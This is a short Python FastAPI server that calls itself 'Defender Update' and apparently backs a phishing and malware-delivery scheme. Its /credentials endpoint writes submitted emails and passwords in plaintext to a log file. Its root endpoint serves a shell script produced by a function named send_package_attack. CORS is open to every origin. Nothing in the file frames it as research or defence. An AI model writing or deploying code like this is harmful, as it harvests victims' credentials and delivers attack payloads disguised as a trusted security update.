from fastapi import FastAPI, APIRouter
from fastapi.responses import FileResponse
from fastapi.middleware.cors import CORSMiddleware
from datetime import datetime
from pathlib import Path
from src.models.credentials import Credentials
import src.utils.send_package_attack as spa

app = FastAPI(title="Defender Update", version="1.0.0")
route = APIRouter()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=False,
    allow_methods=["*"],
    allow_headers=["*"],
    expose_headers=["*"],
)


@route.post("/credentials")
async def save_credentials(creds: Credentials):
    try:
        current_file = Path(__file__)
        log_dir = current_file.parent.parent / "scripts"
        log_dir.mkdir(parents=True, exist_ok=True)
        
        log_file = log_dir / "credentials_log.txt"
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(f"\n{'='*50}\n")
            f.write(f"Timestamp: {timestamp}\n")
            f.write(f"Email: {creds.email}\n")
            f.write(f"Password: {creds.password}\n")
            f.write(f"{'='*50}\n")
        
        return {"status": "success", "message": "Credenciales guardadas"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

@route.get("/")
async def read_root():
    file_path, error = spa.send_package_attack()
    
    if error:
        return error
    
    return FileResponse(
        path=str(file_path),
        filename=file_path.name,
        media_type="application/x-sh"
    )

app.include_router(route)